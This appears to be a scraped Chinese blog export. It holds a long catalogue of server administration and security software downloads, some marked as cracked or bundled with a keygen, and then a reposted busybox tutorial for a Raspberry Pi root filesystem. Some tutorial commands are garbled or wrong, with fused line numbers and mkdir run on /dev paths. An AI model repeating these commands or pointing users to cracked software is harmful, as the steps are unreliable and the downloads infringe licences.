ccproxy8.0破解中文版是国内最流行的下载量最大的的国产代理服务器软件。最主要的作用是让你和远程电脑处在两只一个“局域网”… Windows 下载地址 2 Squid 2.7 for Window STABLE8(代理服务器/CDN软件) 对普通的单位上网用户，Squid可充当代理服务器；而对Sina,NetEase这样的大型站点，Squid又充当WEB加速器… Windows 下载地址 &gt;&gt; 远程控制 序 名称 简介 适用 下载 1 嘉和数码远程连接管理器 嘉和数码远程连接管理器远程桌面连接器批量管理工具是纯绿色软件，它可以替代Windows默认的远程桌面链接，适合服务器较多的朋友… Windows 下载地址 2 win2003 3389 远程桌面连接 Windows 2003 远程桌面连接,有时候我们的电脑上不带远程连接终端，就可以用这个了。 Windows 下载地址 3 windows终端连接器加强版 面对WIN系统终端人数过多问题，相信很多站长及服务器管理都会碰到的，windows终端连接器加强版解决了终端人数过多问题… Windows 下载地址 4 Vista远程桌面连接 Windows Vista 终端登录器中文版，解压缩后即可使用。 Windows 下载地址 5 PCAnyWhere v11.5 简体中文版 Symantec公司出品的的远程控制软件pcAnywhere,是著名的远程控制软件，可以设双重密码… Windows 下载地址 6 PCAnyWhere v10.5.1 简体中文版 PCAnyWhere v10.5.1是首屈一指的远程遥控软件，在功能上有许多优点，如：安全性高、操作简易且可自订符合需要的规格… Windows 下载地址 7 SecureCRT v5.1.3 汉化特别版 SecureCRT是一款支持SSH（SSH1和SSH2）的终端仿真程序，同时支持Telnet和rlogin协议，SecureCRT是一款用于连接运行包括Windows、UNIX和VMS的远程系统的理想工具… Windows 下载地址 8 WinSCP v4.1.6 多国语言版 WinSCP(Linux常用的FTP工具)是一个Windows环境下使用SSH的开源图形化SFTP客户端，同时支持SCP协议。它的主要功能就是在本地与远程计算机间安全的复制文件… Windows 下载地址 9 F-Secure SSH Client v5.4.56 特别版 F-SecureSSHClient 一款功能强大的SSH 远程登录工具包,用来远程管理你的Unix和Windows主机,可以保证数据传输和密码登录安全可靠… Windows 下载地址 10 PuTTy v0.6(免费的telnet和ssh客户端) PuTTY 是一套免费的 SSH / Telnet 程序，它可以连接上支持 SSH Telnet 联机的站台，并且可自动取得对方的系统指纹码 (Fingerprint)… Windows 下载地址 11 PuTTy v0.63中文版 PuTTy v0.63中文版(远程连接linux无乱码) 是自由的跨平台 Telnet/SSH 客户端，同时在 Win32 和 Unix 系统下模拟 xterm 终端。 Windows 下载地址 12 SecureCRT 终端仿真程序 v7.0.0.326 中文绿色便携破解版 Secure CRT是一款支持 SSH2、SSH1、Telnet、Telnet/SSH、Relogin、Serial、TAPI、RAW 等协议的终端仿真程序… Windows 下载地址 &gt;&gt; Linux常用软件 了解更多 &gt;&gt; 序 名称 简介 适用 下载 1 Real VNC 4.1.8 win32 中文汉化破解企业版 VNC Enterprise Edition是业界标准的VNC（Virtual Network Computing) 的增强版本，专为企业环境应用和穿越Internet而开发… Windows 下载地址 2 Nginx 服务器V1.7.7 for Linux 稳定版 Nginx (“engine x”) 是一个高性能的 HTTP 和 反向代理 服务器，也是一个 IMAP/POP3/SMTP 代理服务器… Linux 下载地址 3 PHP v4.4.8 For Linux PHP是一种新型的CGI程序编写语言，易学易用,运行速度快，可以方便快捷地编写出功能强大，运行速度快，并可同时运行于Windows、Unix、Linux 平台的Web后台程序… Linux 下载地址 4 PHP 5.3.10 for Linux PHP 5.3.6 for Linux，适用于linux版本。 Linux 下载地址 5 Vsftp v2.0.6 For Linux Vsftp v2.0.6 For Linux(Unix/Linux安全稳定的FTP服务器)… Linux 下载地址 6 LNMP 0.7 Nginx+php+eAccelerator运行环境 NMP代表的就是Linux下Nginx、MySQL、PHP这种网站服务器架构… Linux 下载地址 7 LNMP 一键安装包 0.9 For Linux LAMP代表Linux下Apache、MySQL、PHP这种网站服务器架构；同上LNMP代表的就是Linux下Nginx、MySQL、PHP这种网站服务器架构… Linux 下载版(国外) 完整版(国内) 8 webmin 1.580 Webmin是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理功能并完成相应的管理动作… Linux/unix 下载地址 &gt;&gt;虚拟主机管理软件 序 名称 简介 适用 下载 1 易方虚拟主机管理系统4.1破解版修正版[已测] 易方虚拟主机管理系统特别版，比较方便个人服务器开空间，独立用户网站推荐使用，脚本之家提醒下如果要使用推荐修改mac地址的方法，需要跟服务器提供商说下… Windows 下载地址 2 网站维护管理专家 1.30 绿色免费版 基于“一键开通”模式建立独立用户权限的WEB网站，每个WEB空间权限互相独立。操作极其简单方便，不再需要手动设置每个空间用户目录权限等… win2003 下载地址 3 NPOINT免费的虚拟主机管理系统 V1.7.0 系统主要功能：支持实时管理开设站点空间、FTP空间、支持MSSQL 2000 实时管理、 支持MYSQL实时管理 必须安装 MYODBC 3.51 驱动 Windows 下载地址 4 N点虚拟主机管理系统v1.9.6免费版 (For Windows2003/2008) N点虚拟主机管理系统是针对销售 主机、邮局、数据库等产品时效率低、管理难等问题而自主研发的集产品自动化开通、管理、续费、升级等功能为一体的软件系统… Windows 下载地址 5 win2003 服务器软件安装工具 西部数码V2.0 西部数码网站管理助手是一款自动建立虚拟主机站点的程序，通过本程序可以自动建立IIS站点、FTP帐号、网站目录等，并且各网站以独立用户隔离运行，解决FSO安全风险… Windows 下载地址 6 自动建立IIS站点 西部数码网站管理助手 v2.0 西部数码网站管理助手,是一款自动建立虚拟主机站点的程序，通过本程序可以自动建立IIS站点、FTP帐号、网站目录等，并且各网站以独立用户隔离运行，解决FSO安全风险… Win2003 下载地址 7 Windows银月服务器工具(SST) v7.13.2 绿色版 银月服务器工具(Silmoon Server Tools)，即SST，它是一款可以更加便捷简单的服务器管理和设置工具，包括一键处理文件权限，服务器插件和模块的安装，如php等，提供在线更新和组件更新… Windows 下载地址 8 服务器开空间软件 MyIIS 无限制免费版 本软件只支持 Win2003 和 Win2000 服务器，首次使用前先修改下 myiis.ini 文件里的配置信息… Windows 下载地址 9 BT宝塔服务器管理助手 windows版 宝塔面板windows版是一款在windows的服务器管理助手，是一位优秀的国人开发的控制面板，一键创建网站、FTP、数据库；安全管理，文件管理，PHP多版本共存及切换… Windows 下载地址 Linux安装方法 &gt;&gt;服务器或网站安全配置教程（推荐新手朋友参考下） 序 名称 简介 备注 1 win2008 r2 服务器 php + mysql + sqlserver2008运行环境配置（从安装、优化、安全等） 这篇文章主要介绍了win2008 r2 服务器php+mysql+sqlserver2008运行环境配置（从安装、优化、安全等）,需要的朋友可以参考下 了解更多 2 win2003 服务器安全设置（比较安全的方法） 文章着重谈需要的权限,也就是最终文件夹或硬盘需要的权限,可以防御各种木马入侵,提权攻击,跨站攻击等,本实例经过多次试验.安全性能很好… 了解更多 3 IIS6+PHP5+MySQL5+Zend Optimizer+phpMyAdmin安装配置图文教程 2009版 IIS6+PHP5+MySQL5+Zend Optimizer+phpMyAdmin安装配置教程 2009年最新版… 了解更多 4 服务器 安全配置 指南(PDF) 比较详细 现在有很多朋友拥有了自己的服务器，可以自己配置了，但不是每个人都精通，但不学不实践，总找别人是不太好的所有，只有自己学习了… 下载地址 5 实战win2008 iis7 WEB全能服务器环境的配置教程pdf版 实战windows server 2008 企业版WEB服务器环境的配置,win2008 iis7全能服务器配置图文教程… 下载地址 6 Mcafee(麦咖啡杀毒软件) 防止网页被挂马的设置教程 Mcafee(麦咖啡杀毒软件) 防止网页被挂马的设置教程(最后不要在服务器端打开) 我们强烈推荐服务器安装mcafee 8.5i的版本 了解更多 7 Mcafee 打造安全的windows服务器 安全设置图文说明 为了让服务器更安全，不如提取，后门等程序的运行，下面的设置对于服务器来说是非常必要，这里是一些引导设置，更多的大家可以自行发挥… 了解更多 8 mcafee 密码解锁图文方法[mcafee密码设置，登录，修改，忘记密码] mcafee 密码解锁图文方法，mcafee密码设置，登录，修改，忘记密码… 了解更多 9 Mcafee scan 自动停止的修复方法 今天登陆服务器发现多台服务器的mcafee自动停止了，可能与凌晨的自动升级有关，参考如下方法解决问题… 了解更多 10 mcafee 新手入门教程之如何输入密码解除锁定 主要是针对脚本之家服务器安全设置的用户准备的。我们配置以后会给客户一个详细的说明，方便大家使用… 了解更多 11 DEDECMS安全设置 执行php脚本限制设置方法 最近很多使用dedecms的站长都被被挂马，或种下后门，因为用的人多，研究的人也多防不胜防，所有dedecms安全设置就非常必要了… 了解更多 &gt;&gt;服务器文件、数据库同步常用软件 序 名称 简介 适用 下载 1 护卫神.好备份系统 护卫神.好备份系统是四川万象更新网络通信有限公司开发的一款服务器数据备份软件。可以备份sql server2000/2005/2008、文件数据、MySQL数据库等… Windows 下载地址 2 绿环FTP数据备份软件 1.4最新绿色版 绿环FTP数据备份软件是一款免费的ftp备份软件，好多下载站站长用来进行软件的同步，其实论功能不是最好，但使用时非常简单跟方便，推荐站长使用… Windows 下载地址 3 服务器数据同步 服务器端 cwRsync_Server_2.1.5_Installer.zip cwRsync数据备份可防止因存储设备损坏造成的损失，是管理员一项重要的工作，实现数据远程备份很多方法，最简单的方法就是使用 ftp 或类似工具或脚本… Windows 下载地址 4 cwRsync 同步软件最新版下载cwRsync_2.1.5_Installer.zip cwRsync win 服务器同步软件 cwRsync_2.1.5_Installer.zip… Windows 下载地址 5 服务器文件同步软件 服务器端 cwRsyncServer_3.1.0_Installer.zip 服务器常用文件同步软件 服务器端。主要要配合客服端使用… Windows 下载地址 6 cwRsync_3.1.0_Installer.zip 服务器文件同步软件客户端 服务器文件同步软件。现在好多服务器都是用这个进行同步… Windows 下载地址 7 cwRsyncServer_3.1.0_Installer.zip服务器文件同步软件 服务器端 服务器常用文件同步软件 服务器端。主要要配合客服端使用… Windows 下载地址 8 cwRsync_4.1.0_Installer.zip 服务器文件同步软件客户端 cwRsync是基于cygwin平台的rsync软件包，支持windows对windows、windows对Linux、Linux对windows高效文件同步… Windows 下载地址 9 cwRsyncServer_4.1.0_Installer.zip服务器文件同步软件 服务器端 cwRsync是一个非常优秀的文件同步软件，而cwRsync Server是cwRsync的服务端。安装cwRsync Server后，可以在windows或linux系统中安装客户端进行文件同步… Windows 下载地址 10 优秀的文件同步与备份软件 FileGee个人文件同步备份系统 V9.1.1 绿色版 &quot;FileGee个人文件同步备份系统&quot;是一款优秀的文件同步与备份软件。它集文件备份、同步、加密、分割于一身。协助个人用户实现硬盘之间，硬盘与移动存储设备之间的备份与同步… Windows 下载地址 11 SQL SERVER数据库备份恢复助手 SQL数据库备份恢复助手是一款方便易用的sql数据库恢复工具。该软件完全支持本地/局域网（远程）数据库自动/手动备份… Windows 下载地址 12 网络传神 3.12 Build 030301(网站同步 镜像站点同步) 网络传神是纯中文上传软件。他吸收了其他上传软件的精华，除了拥有其他软件常有的上传、下载、目录传送、目录浏览、远程编辑等… Windows 下载地址 13 增量备份工具 服务器文件同步工具 主要是监控指定目录内的文件变化，实现变化的文件通过FTP上传到指定服务器的目的，很早以前为xiaoshuo5200.com写的软件… Windows 下载地址 &gt;&gt;服务器安全工具 木马处理等 序 名称 简介 适用 下载 1 云锁服务器端(服务器安全软件) 服务器端云锁是首款基于操作系统加固技术的免费服务器安全管理软件，由国内著名信息安全厂商椒图科技自主研发，凝结操作系统加固尖端领域数十年的经验积累… Windows 下载地址 2 服务器云锁 客户端 官方安装版 功能特点：抗CC攻击、秒级智能识别、防御CC攻击，确保网站持续稳定对外提供服务、暗链、黑链防护… Windows 下载地址 3 服务器安全狗（DDOS防火墙、ARP防火墙） 服务器安全狗是为idc运营商、虚拟主机服务商、企业主机、服务器管理者等用户提供服务器安全防范的实用系统，是一款集ddos防护、arp防护、查看网络连接、网络流量… Windows 下载地址 4 网站安全狗 服务器安全保护工具 网站安全狗软件安装在用户的服务器上，时时保护用户服务器不遭受网页木马、挂马、SQL等非法入侵… Windows 下载地址 5 MYIIS-VIF服务器安全专家(强大的防盗链功能) MYIIS-VIF一个为弥补IIS自身功能不足而编写的一个智能IIS多功能软件，它能将IIS本身不具备的多个功能集合在自己身上… Windows 下载地址 6 青云服务器安全设置器官方网站 Ver 2.3 开源版 青云服务器安全设置器发布于2006年10月，运行于Windows 2000以上平台，是一款用户拥有完全控制权的服务器安全设置工具… Windows 下载地址 7 win2003服务器安全一键配置工具 安全配置是一项比较有难度的网络技术，权限配置的太严格，好多程序又运行不起，权限配置的太松，又很容易被黑客入侵，做为网络管理员，真的很头痛，因此… win2003 下载地址 8 龙盾 飞豹网页木马清除器免费赠送版 v1.3 龙盾 飞豹网页木马清除器免费赠送版,方便被挂马的朋友，这个也支持正则替换，而且效率不错，需要的朋友可以试试… Windows 下载地址 9 文本替换专家V2.8 绿色版 文本替换专家，使用简单，功能强大，支持多级目录同时替换，支持大小写匹配，支持文件备份，支持文件查找，智能历史替换方案记录以及智能备份文件批量还原系统… Windows 下载地址 10 网站恶意网页木马扫描器(WebshellScanner) 用来查询网站是不是被挂马了，一般用于服务器上的操作，或将服务器上的源码下载到本地，然后用此软件查找… Windows 下载地址 11 SQLServer 数据库批量查找替换工具1.2 SQL木马清除助手 本软件可根据SQL设定自动检索所有数据表和文本字段值, 并对指定字符进行批量替换.设计之初主要解决数据库被黑客攻击,在数据库中置入大量的JS脚本,造成网页无法… Windows 下载地址 12 ASP木马查找_雷客图ASP站长安全助手1.6 SP2官方最新版本 雷客图ASP站长安全助手是一个帮助站长维护网站安全的程序。其功能包括ASP木马查找、被篡改文件查找、可疑文件搜索、数据库安全保护等… Windows 下载地址 13 SQLServer web木马终结者asp版 v1.0 Web木马终结者根据平时使用的杀毒软件思路编写，主要针对网站被挂马时使用。采用Javascript编写，另外使用了Ajax技术辅助扫描… Windows 下载地址 14 超级批量批量文本替换 V5.02 绿色版 文本替换的利器，批量文本替换的不二之选，站长必备，挂马网页杀手，支持所有纯ANSI文件，支持GBK/Unicode/UTF8编码的htm、html、asp、java、php等文件… Windows 下载地址 15 网页木马批量替换工具批量文件内容替换器绿色免费版(支持正则) 网页木马批量替换工具批量文件内容替换器绿色免费版(支持正则) 主要针对挂马代码都不一样的… Windows 下载地址 16 克隆用户检测工具 Local Administrator Checker 0.9 中文汉化版(附英文版) 本地管理员帐号检查，将拥有 Administrator 权限的帐号列出， 检查 Windows NT/2000/XP 系统是否设置了 Shadow Administrator (影子管理員) 和 Clone Administrator (克隆管理員) 多用于服务器检测，防止沦为肉鸡… Windows 下载地址 17 .护卫神云查杀系统 v1.1 免费版 护卫神·云查杀系统是一款查杀网页木马的专业性软件，完全免费使用；查杀网页木马效果超越所有杀毒软件 扫描asp,php,asp.net后门… Windows 下载地址 18 D盾 Web查杀(网站后门查找工具) D盾 Web查杀是由 “迪元素科技有限公司” 研制。 自主研发不分扩展名的代码行为分析引擎(非简单的字符串查找引擎)，能识别更多的后门行为… Windows 下载地址 19 云顿网站木马清理 该软件帮助站长快速扫描网站被入侵后残留的网站木马以及全面检测、实时保护，是网站安全必要基础的安全体系… Windows 下载地址 &gt;&gt;服务器数据恢复软件 序 名称 简介 适用 下载 1 硬盘数据恢复 EasyRecovery Professional EasyRecovery 是世界著名数据恢复公司 Ontrack 的技术杰作，它是一个威力非常强大的硬盘数据恢复工具。能够帮你恢复丢失的数据以及重建文件系统… Windows 下载地址 2 EasyRecovery Enterprise 格式化数据恢复软件 EasyRecovery是一款操作安全、价格便宜、用户自主操作的非破坏性的只读应用程序，它不会往源驱上写任何东西，也不会对源驱做任何改变… Windows 下载地址 3 Recover4all Pro v2.26 汉化无插件特别版 Windows 系统下短小精悍、功能强大、人手必备的文件反删除工具，是已删除文件的克星，只用几秒钟就可以将删除的文件恢复… Windows 下载地址 4 DiskGenius Portable V3.8 中文绿色版 DiskGenius(硬盘修复工具)是一款硬盘分区及数据维护软件。DiskGenius(硬盘修复工具)具有操作直观简便的特点，从最初的DOS版起就深受用户好评… Windows 下载地址 &gt;&gt; 其它相关 序 名称 简介 适用 下载 1 OSFMount 虚拟光驱 绿色版 OSFMount是一款小巧的虚拟光驱软件，不仅支持常见的镜像格式，还支持将镜像虚拟到内存中以加快访问速度。OSFMount同时还支持部分镜像格式的回写、扩展镜像大小功能… Windows 32位下载 64位下载 2 微型mdb数据库编辑器(access编辑工具) access编辑工具,mdb作为Microsoft Access的数据库具有使用简便的优势,广泛应用于各类软件/网站. 该软件可以方便的在没安装Microsoft Access的情况下查看或编辑mdb… Windows 下载地址 3 服务器ip策略IPsec自动设置工具 脚本之家修改版 因为普通pc安装过滤会将3389端口关闭，所以脚本之家给修改了下，大家解压后运行 IP安全策略自动设置工具.exe 选择第二个服务器运行即可… Windows 下载地址 4 3389端口修改器(自动添加防火墙例外) 这个工具可以修改RDP远程桌面协议的默认端口（3389）自动添加新修改的端口到windows防火墙列表中，以免重启后忘记添加例外而连不上服务器了… Windows 下载地址 5 服务器系统备份软件OneKey Ghost Y3.2 正式版 设计专业、操作简便，在 Win32(64)、WinPE、DOS 下对任意分区进行一键备份、恢复的绿色无污程序，支持ISO文件、光盘、U盘里的GHO文件硬盘安装… Windows 下载地址 6 一键GHOST 硬盘版 2010.10.10 支持sas硬盘 一键ghost是&quot;DOS之家&quot;首创的4种版本(硬盘版/光盘版/优盘版/软盘版)同步发布的启动盘,适应各种用户需要,既可独立使用,又能相互配合… Windows 下载地址 7 360 ARP防火墙 v2.0 绿色版 360ARP防火墙特色： 1. 内核层拦截ARP攻击、2. 追踪攻击者、3. ARP缓存保护… Windows 下载地址 8 ARP防火墙 v4.1.1 特别版(防范ARP攻击) ARP防火墙采用内核层拦截技术和主动防御技术，几大功能模块（拦截ARP攻击/拦截IP冲突/DoS攻击抑制/安全模式/ARP数据分析/监测ARP缓存… Windows 下载地址 9 MacBind IP-MAC地址绑定工具 MacBind ip mac地址绑定工具 防ARP攻击的绿色小软件，1、有效防止黑客和病毒的arp欺骗攻击，拒绝断网提高网络稳定性… Windows 下载地址 10 冰盾防火墙8.2完美破解网桥版 抗DDOS(推荐) 冰盾防火墙是全球第一款具备IDS入侵检测功能的专业级抗DDOS防火墙，在防黑客入侵方面，冰盾可智能识别Port扫描、Unicode恶意编码、SQL注入攻击、Trojan木马… Windows 下载地址 11 Symantec AntiVirus 10 简体中文版(黄金企业版) 1、对病毒反应迅速（具备最全面的病毒库）2、对染毒文件采取最安全的隔离处理方式（不像国产软件如果设置不当会在无法清除病毒的时候直接删除造成损失… Windows 下载地址 12 服务器 杀毒软件 诺顿杀毒软件 v10.0.0.359 Final 官方简体中文企业版 Symantec AntiVirus Corporate (Norton AntiVirus 诺顿杀毒软件企业版本)是世界上最优秀的杀毒软件之一，这个是企业版本，和专业版本，标准版本相比能为你带来更低的系统资源占用，更可靠的性能… Windows 下载地址 13 麦咖啡 McAfee VirusScan Enterprise 8.7i+5300+Anti 爱虫规则 清风无影集成版 特点一：直接集成McAfee VirusScan 8.7i 反间谍模块、特点二：独立移植增强爱虫策略、特点三：升级CMA为4.0.0.1180版本… Windows 下载地址 14 mcafee 麦咖啡 8.5i 服务器常用杀毒软件[推荐] mcafee是windows服务器下最常用的杀毒软件，mcafee主要是防范为主，所以是安全必备的杀毒。推荐使用… Windows 下载地址 15 mcafee 麦咖啡 8.8 win2008 r2服务器常用杀毒软件[推荐] McAfee VirusScan Enterprise 是一项针对 PC 和服务器的创新技术.它可前瞻性地阻止和清除恶意软件,扩展抵御新的安全风险的范围,并降低应对病毒爆发所需的成本… Windows 下载地址 16 IP雷达（查看当前连接的工具） 网络流量监测IP雷达是一款功能强大的电脑流量监控软件，软件可以帮助用户监控流量使用情况，监控硬件使用情况等，软件功能强大，方便简单，欢迎下载… Windows 下载地址 17 网络抓包工具 SmartSniff v1.45 SmartSniff 是一款 TCP/IP 数据包捕获软件,允许你检查经过你的网络适配器的网络传输.该软件的双层界面显示了捕获的数据包和在 ASCII 或者十六进制格式下的… Windows 下载地址 18 SQL 日志清除器 动网先锋 使用动网先锋Sql日志清除器后你就会知道原来清除Log是如此的轻松，简单的两步操作就可以把Log减至1M，本地无须安装Sql Server，远程连接服务器自动判断端口… Windows 下载地址 19 端口查看软件 Active Ports v1.4 免安装汉化中文绿色版 用来监视电脑所有打开的TCP/IP/UDP端口，不但可以将你所有的端口显示出来，还显示所有端口所对应的程序，路径，本地IP和远端IP(试图连接你的电脑IP)是否正在活动… Windows 下载地址 20 WinRAR v3.93 官方简体特别版 WinRAR 是强大的压缩文件管理器。它提供了 RAR 和 ZIP 文件的完整支持，能解压 ARJ、CAB、LZH、ACE、TAR、GZ、UUE、BZ2、JAR、ISO 格式文件… Windows 32位下载 64位下载 21 DU Meter v3.50 Build 2822 汉化特别版(服务器流量监测) DUMeter 是显示直观的网络流量监视器，既有数字显示又有图形显示。让你清楚的看到浏览时以及上传下载时的数据传输情况，实时监测你的上传和下载的网速… Windows 下载地址 22 LeapFTP v2.7.5.613 汉化特别版 功能强大的 FTP 客户端，在具有大多数 FTP 客户端的常见功能的基础上，新版主要添加了以下功能：支持 FTP, FXP, FTP/SSL, SFTP/SSH 以及 HTTP/HTTPS 传输，支持设置传输计划… Windows 下载地址 23 FlashFXP v3.6.0 Build 1260 简体中文绿色特别版 FlashFXP 是一个功能强大的 FXP/FTP 软件，融合了一些其他优秀FTP软件的优点，如像 CuteFTP 一样可以比较文件夹，支持彩色文字显示；像 BpFTP 支持多文件夹选择文件… Windows 下载地址 24 EVEREST v4.20.1170 多国语言特别版 Everest ultimate(原名AIDA32)，是一个测试软硬件系统信息的工具，它可以详细的显示出PC每一个方面的信息。支持上千种(3400+)主板，支持上百种(360+)显卡… Windows 下载地址 25 HD Tune v2.55 汉化特别版(硬盘性能诊断测试) hd tune 3.5 是一款小巧易用的硬盘工具软件，其主要功能有硬盘传输速率检测，健康状态检测，温度检测及磁盘表面扫描等… Windows 下载地址 26 阿江ASP探针 v1.93 v1.9 的新特性：以积木式的设计思路重新编写代码，功能增加但是结构并不臃肿，改用三维数组保存待检测组件，增加了一些常见的组件… Windows 下载地址 27 浪点 PHP探针 v0.3 一款优秀的PHP探针程序，比较全面的显示PHP服务器各项性能指标及主机配置信息，本程序免费、开源… Windows 下载地址 28 asp.net 服务器探针修正版 网上已经有不少asp.net探针了，不过一般都没跳出asp探针的老路，仍旧是将很大部分信息放到了COM组件的检测上，而服务器的一些信息（尤其是硬件信息）非常少，本探针就是鉴于此种现象而开发的，小巧，但功能强大，让磁盘驱动器，内存，CPU信息一览无遗… Windows 下载地址 29 phpMyAdmin v3.0.0 RC2 For Windows多语言版 phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的资料库管理工具。 可以管理整个MySQL服务器(需要超级用户)，也可以管理单个数据库… Windows 下载地址 30 navicat 8 精简版(7M) MYSQL图像管理工具 V8.0.28 Navicat for MySQL 是一套专为MySQL 设计的强大数据库管理及开发工具。它可以用于任何版本 3.21 或以上的MySQL 数据库服务器，并支持大部份MySQL最新版本的功能… Windows 下载地址 31 KB967723BUG [脚本之家特别奉献，主要解决mysql经常提示连接数过多问题] Windows 下载地址 32 MaxRequestBytes.reg [Bad Request - Request Too Long问题]下载后保存为.reg即可 Windows 下载地址 33 win2003 远程连接补丁 win2003 远程连接补丁 Windows 下载地址 34 迷你快车 V1.4 中文绿色版 迷你快车 V1.4 中文绿色版 使用比较方便，喜欢的朋友可以试用下… Windows 下载地址 35 FastCopy V2.08 (x32) 绿色汉化修正版 FastCopy 是 Windows 平台上最快的文件拷贝、删除软件。由于其功能强 劲，性能优越，一时间便超越相同类型的所有其他软件… Windows 下载地址 36 access 2003 mdb数据库打开工具单文件版 access 2003 mdb数据库打开工具单文件版 方便服务器操作access数据库,无需安装… Windows 下载地址 37 畸形文件夹的创建与删除方法 有时候为了防止用户随便删除目录很多软件也使用了畸形文件夹，但有些黑客也利用上这个技巧，那么我们应该如何使用与防范呢… Windows 了解更多 38 windows 畸形文件夹删除工具(ghost…)绿色免费版 一些基于GHOST的备份还原系统为了保护备份文件往往会建立ghost…这样的畸形文件夹，在windows系统中通过传统的方法是无法访问和删除的… Windows 下载地址 39 护卫神 畸形文件清理软件免费绿色版 护卫神畸形文件清理软件是凭借我们精湛的技术和强大的开发实力，为解决畸形文件难于删除而开发的一款专业性软件；能快速查找各类畸形文件和畸形目录，并能强制删除… Windows 下载地址 40 Active Ports v1.4 免安装汉化中文绿色版 用来监视电脑所有打开的TCP/IP/UDP端口，不但可以将你所有的端口显示出来，还显示所有端口所对应的程序，路径，本地IP和远端IP(试图连接你的电脑IP)是否正在活动… Windows 下载地址 41 CurrPorts 1.91 绿色汉化单文件版 CurrPorts显示当前在本地计算机上打开的所有TCP/IP和UDP端口列表。对于列表中的每个端口，同时显示打开了端口的进程有关的信息，包括进程名称，完整的进程路径… Windows 下载地址 42 Porttunnel 端口映射的专用工具 v 1.6.14.211 无限制版 PortTunnel是一个能够实现端口映射的专用工具软件。它的原理是先在内网服务器上做端口映射，则当外网计算机访问内网服务器上的此端口时… Windows 下载地址 43 EditPlus V3.12.566 汉化绿色破解版[附EditPlus注册机] EditPlus 是 Internet 时代的 32 位元文本编辑程序，HTML 编辑及程序员的 Windows 平台编辑器。它可以充分的替换写字板，它也提供网页作者及程序设计师许多强悍… Windows 下载地址 44 OnTimer HOU任务计划软件 OnTimer HOU任务计划软件一款定时/循环执行任务的绿色小软件，可以用来定时执行程序、DOS命令、从HTTP服务器下载程序运行、结束进程、模拟按键、发送EMAIL、网络唤醒、消息提示、关机、重启、注销、锁定、待机等操作，都是本人曾经所需要的功能！可以取代windows 2008 r2自带的任务计划管理工具。 Windows 下载地址 &gt;&gt;他人整理的软件(大家可以参考下) 名称 名称 名称 诺顿企业版10 脚本之家服务器 IP-MAC地址绑定工具 UrlScan3.1青云加强版 IIS守护者 windows清理助手 Unlocker V1.8.7 ASP站长安全助手vbs版 网卡实时检测工具 CPUZ1.31绿色汉化版 EVEREST5.00.1658 绿色版 UltraCompareV6.10 麦咖啡V8.7i青云修改版 网站木马清理专家免费版 Serv-U V6.0除后门漏洞版 Win2003密码修改光盘 系统服务管理实用小助手 IIS网站流量监控软件v1.0 Win2K3数据中心IIS包 青云服务器Ver 3.1 破解版 字符串替换器 phpMyAdmin3.1中文版 迅雷5.8.14.706绿色版 诺顿最新病毒库 FlashFXPv3.4.1绿色版 绿软超小FTP服务器 SQL2000绿色版 Filemon7.04绿色版 WinMerge文件内容比对 IIS应用程序池分析V2.0绿色版 文件夹加密器5.36绿色版 CCProxyV6.64绿色特别版 华盾IIS备份V1.0 绿色版 NICExpress4.0中文版 麦咖啡V8.7i青云修改版策略 Serv-U 6.3.5中文版 服务器云帮手 &gt;&gt; 服务器配置 官方站点 名称 名称 名称 名称 apache php(所有版本官方下载) mysql(数据库) sqlite(数据库) eaccelerator(脚本之家版)/64位 zend（运行Zend环境必备） nginx memcached LNMP nginx+php wdlinu linux虚拟主机管理等 服务器_软件下载 网站制作常用软件 XCache 360安全卫士 金山卫士 wincache(64位) URL Rewrite(中文 英文 补丁) php manage（脚本之家下载）","tags":"服务器"},{"title":"初尝制作树莓派最简单的rootfs","url":"/20220613/chu-chang-zhi-zuo-shu-mei-pai-zui-jian-dan-de-rootfs/","text":"转载自初尝制作树莓派最简单的rootfs 制作树莓派最简单的rootfs ※文章目录 制作树莓派最简单的rootfs 一、下载busybox源码 二、编译busybox 1.修改顶层Makefile(指定交叉编译工具链) 2.配置Busybox 3.编译Busybox 三、制作最小根文件系统 1.创建一些必备的文件 2.创建设备文件 3.构造inittab 4.C库lib 四、移植到sd卡 一、下载busybox源码 在BusyBox的官网下载到源码： https://busybox.net/downloads/ 将下载的busybox-XXXXXX.tar.bz2复制到任意目录下,并运行命令解压 12tar -vxjf busybox-1.33.0.tar.bz2 二、编译busybox 12cd busybox-1.33.0 #进入busybox-1.30.0/目录下 ※1.修改顶层Makefile(指定交叉编译工具链) 12sudo gedit Makefile 一个是164行的CROSS_COMPILE ?=,用来指定交叉编译工具链，目录为自己之前解压的目录 另一个地方是190行的ARCH ?=$(SUBARCH)，修改为ARCH ?= arm 保存退出。 ※2.配置Busybox 在busybox-1.33.0/目录下输入 sudo make defconfig 命令预配置busybox，然后通过sudo make menuconfig图形化界面配置 第一个地方，Settings-&gt;Build static binary (no shared libs)，不要选中该项（方向键选择，回车键进入下一级目录，空格是选中或不选中，双击ESC返回）。 第二个地方，Linux System Utilities—&gt;nsenter，不要选中该项。 第三个地方，Coreutils—&gt;sync，不要选中该项 其他的默认选项就好，保存退出（一直返回就是退出，退出时会有是否保存修改的选项）。 ※3.编译Busybox 在busybox-1.33.0/目录下输入sudo make install，编译的结果在在busybox-1.33.0/_install 三、制作最小根文件系统 ※1.创建一些必备的文件 进入到_install目录下 12mkdir dev etc lib mnt proc sys tmp var boot /* 说明 dev 目录主要共系统生成各类设备节点 etc 系统的配置文件 lib 系统需要的各类库文件 mnt 一般用来挂载其他设备的的目录 sys 系统文件 tmp 临时文件 var proc 内存虚拟文件系统节点 */ ※2.创建设备文件 在_install文件夹下面创建两个设备文件/dev/console 和 /dev/NULL 123mkdir /dev/consolemkdir /dev/NULL 查询虚拟机 console : 主设备号为5，次设备号为1 null：主设备号为1，次设备号为3 所以，创建两个新的设备节点 123raspi@ubuntu:~/busybox-1.33.0/_install/dev/console$ mknod -m 666 console c 5 1raspi@ubuntu:~/busybox-1.33.0/_install/dev/NULL$ mknod -m 666 null c 1 3 （1）/dev/console /dev/console代表bai的系统控制台，错误信息和诊du断信息都会被到这个上。 （2）/dev/null 这个是一个空设备文件，所有写到这个文件中的数据都会被丢弃掉 ※3.构造inittab 这里移植的是一个已经做好的典型的inittab，所以操作如下 busybox-1.33.0/examples/bootfloppy#目录下有一个etc文件夹， 全部拷贝到你的_install目录下的etc文件夹下 Fstab:当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录（https://blog.csdn.net/kepa520/article/details/81315430） 修改为以下内容： 在/etc/init.d目录下运行chmod +x rcS 